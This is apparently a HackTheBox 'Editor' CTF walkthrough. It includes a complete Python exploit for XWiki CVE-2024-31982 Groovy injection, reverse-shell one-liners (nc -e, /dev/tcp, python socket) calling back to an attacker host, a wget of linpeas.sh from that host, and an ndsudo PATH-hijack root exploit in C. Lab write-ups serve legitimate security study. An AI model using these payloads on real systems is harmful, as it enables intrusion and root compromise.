# 📝 HackTheBox - Editor

---

## 📌 Overview  
This writeup documents the complete exploitation process of the HTB "Editor" machine — from reconnaissance to root — executed in **Thanatos Terminal** style.  

---

## 1️⃣ Reconnaissance 🔍  

### **Full Nmap Scan**  
Executed from:  
```bash
root@kali:/home/thanatos/Desktop/htb/machines/editor# nmap -sC -sV -p- -T4 <target-ip>
```

**Findings:**
- **Port 22** → SSH service (OpenSSH 8.9p1)  
- **Port 80** → Nginx web server hosting *Editor - SimplistCode Pro*  
- **Port 8080** → Jetty server running XWiki application  

**Key Observation:**  
The XWiki instance on port 8080 exposes multiple admin-related endpoints via `robots.txt` and supports WebDAV methods.  

---

## 2️⃣ XWiki Version Discovery & Vulnerability Analysis 🛠  

**Version Identified:** XWiki 15  
**CVE:** CVE-2024-31982 — *Remote Code Execution via Groovy Script Injection*  

**Vulnerability Breakdown:**
- Unauthenticated RCE possible through Groovy script injection in search endpoints  
- Access control bypass via RSS feed functionality  
- Multiple attack vectors: `SolrSearch`, `DatabaseSearch`  

---

## 3️⃣ Exploit Development 💣  

**Python Exploit Script** (CVE-2024-31982 Groovy Injection)  
```python
# Stored full Python exploit script here
# #!/usr/bin/env python3
import requests
import argparse
import urllib.parse
import urllib3
import re
import sys
from html import unescape

# Turn off SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class XWikiRCE:
    def __init__(self, host):
        self.host = host
        self.base = self._find_accessible_protocol()

    def _find_accessible_protocol(self):
        """Try HTTPS first, then HTTP, return the one that works."""
        for proto in ("https", "http"):
            url = f"{proto}://{self.host}"
            try:
                resp = requests.get(f"{url}/xwiki", timeout=5, verify=False)
                if resp.ok:
                    print(f"[+] Using: {url}")
                    return url
            except requests.RequestException:
                pass
        print("[!] Target not responding on HTTP/HTTPS")
        sys.exit(1)

    def _groovy_wrapper(self, cmd):
        """Wraps a command in Groovy code for execution."""
        code = (
            "def sout=new StringBuilder(), serr=new StringBuilder();"
            f"def proc=\"{cmd}\".execute();"
            "proc.consumeProcessOutput(sout, serr);"
            "proc.waitForOrKill(3000);"
            "println \"$sout$serr\";"
        )
        return code

    def _rev_shell_cmd(self, lhost, lport, mode):
        if mode == "busybox":
            return f"busybox nc {lhost} {lport} -e /bin/sh"
        if mode == "bash":
            return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        if mode == "python":
            return (
                "python3 -c \"import socket,subprocess,os;"
                f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((''{lhost}'',{lport}));"
                "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                "subprocess.call(['/bin/sh','-i'])\""
            )
        return None

    def _craft_injection(self, groovy_code):
        """Creates the XWiki payload injection."""
        injection = f"}}}}{{async async=false}}{{groovy}}{groovy_code}{{/groovy}}{{/async}}"
        return urllib.parse.quote_plus(injection)

    def _extract_output(self, html):
        patterns = [
            r"<description>RSS feed for search on \}}}(.*?)</description>",
            r"<description>(.*?)</description>",
            r"<content:encoded><!\[CDATA\[(.*?)\]\]></content:encoded>"
        ]
        for pat in patterns:
            m = re.findall(pat, html, re.DOTALL)
            if m:
                return unescape(m[0].strip())
        return "[!] No recognizable output."

    def run_command(self, cmd, endpoint="SolrSearch"):
        groovy_code = self._groovy_wrapper(cmd)
        payload = self._craft_injection(groovy_code)

        if endpoint == "SolrSearch":
            url = f"{self.base}/xwiki/bin/get/Main/SolrSearch?media=rss&text={payload}"
        else:
            url = f"{self.base}/xwiki/bin/get/Main/DatabaseSearch?outputSyntax=plain&space=&text={payload}"

        try:
            r = requests.get(url, timeout=10, verify=False)
            if r.ok:
                return self._extract_output(r.text)
            return f"[HTTP {r.status_code}] {r.text[:200]}"
        except Exception as e:
            return f"[!] Error: {e}"

    def trigger_reverse_shell(self, lhost, lport, shell_type="busybox"):
        print(f"[+] Sending reverse shell: {shell_type} -> {lhost}:{lport}")
        shell_cmd = self._rev_shell_cmd(lhost, lport, shell_type)
        if not shell_cmd:
            print("[!] Unsupported shell type")
            return

        # Build and send one-way payload
        inj = f"}}}}{{async async=false}}{{groovy}}\"{shell_cmd}\".execute(){{/groovy}}{{/async}}"
        encoded = urllib.parse.quote_plus(inj)
        url = f"{self.base}/xwiki/bin/get/Main/SolrSearch?media=rss&text={encoded}"

        try:
            requests.get(url, timeout=5, verify=False)
            print("[+] Payload dispatched.")
        except:
            print("[+] Payload sent, connection may close if shell succeeded.")

def main():
    parser = argparse.ArgumentParser(description="Exploit for XWiki CVE-2024-31982 (Groovy Injection)")
    parser.add_argument("-t", "--target", required=True, help="Target host (e.g., site.com:8080)")
    parser.add_argument("-c", "--command", help="Command to run on target")
    parser.add_argument("-r", "--reverse-shell", action="store_true", help="Get reverse shell")
    parser.add_argument("--lhost", help="Local host for reverse shell")
    parser.add_argument("--lport", help="Local port for reverse shell")
    parser.add_argument("--shell-type", choices=["busybox", "bash", "python"], default="busybox")
    parser.add_argument("--endpoint", choices=["SolrSearch", "DatabaseSearch"], default="SolrSearch")

    args = parser.parse_args()

    exploit = XWikiRCE(args.target)

    if args.reverse_shell:
        if not args.lhost or not args.lport:
            print("[!] Need both --lhost and --lport for reverse shell.")
            sys.exit(1)
        exploit.trigger_reverse_shell(args.lhost, args.lport, args.shell_type)
    elif args.command:
        result = exploit.run_command(args.command, args.endpoint)
        print(f"[Output]\n{result}")
    else:
        print("[!] Provide either --command or --reverse-shell")

if __name__ == "__main__":
    main()

```

---

## 4️⃣ Exploitation Process 💥  

**Step 1:** Start Listener  
```bash
nc -lvnp 4444
```

**Step 2:** Execute Exploit for Reverse Shell  
```bash
python3 exploit.py -t editor.htb:8080 -r --lhost 10.10.xx.xx --lport 4444
```

**Result:**  
✅ Reverse shell obtained as `xwiki`  
✅ Upgraded shell using Python pty spawn  

---

## 5️⃣ Credential Discovery & SSH Access 🔑  

While enumerating as `xwiki`, located file:  
```
/usr/lib/xwiki/WEB-INF/hibernate.cfg.xml
```

**Plaintext Credentials:**
```
username: xwiki
password: xxxxxxxxxxx
```

**SSH Access:**
```bash
ssh oliver@editor.htb
```
✅ Successful login as **oliver**  

---

## 6️⃣ Privilege Escalation 🚀  

### Step 1 — Enumeration with LinPEAS & LinEnum  
```bash
# On attacker machine
python3 -m http.server 8080

# On target machine
wget http://<attacker-ip>:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**SUID Binaries Found (partial list):**
```
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chfn
...
```

---

### Step 2 — Understanding `ndsudo`  
**What is it?**  
- Part of Netdata Agent, SUID root binary used to execute specific system commands.  

**The Flaw:**  
- `ndsudo` uses the `PATH` environment variable to locate commands.  
- Attacker can place a malicious binary with the same name as a whitelisted command and prepend its location to `PATH`.  
- Result: Arbitrary command execution as root.  

---

### Step 3 — Exploiting `ndsudo` via PATH Hijacking  

**Malicious C Program:**
```c
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
```

**Execution Steps:**
```bash
cat <<EOF > exploit.c
[...code above...]
EOF

gcc exploit.c -o nvme
export PATH=$(pwd):$PATH
chmod +x nvme
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

✅ Root shell obtained  

---

## 🎯 Mission Summary  

**Skills Used:**
- Network & Service Enumeration  
- Web Application Exploitation (XWiki CVE-2024-31982)  
- Reverse Shell Deployment  
- Credential Harvesting  
- Privilege Escalation via PATH Hijacking  

**Final Status:**  
```
[ ROOT ACCESS GAINED — SESSION LOGGED ]
```
---

```
[ Thanatos Terminal v3.7 — Session Complete ]
```
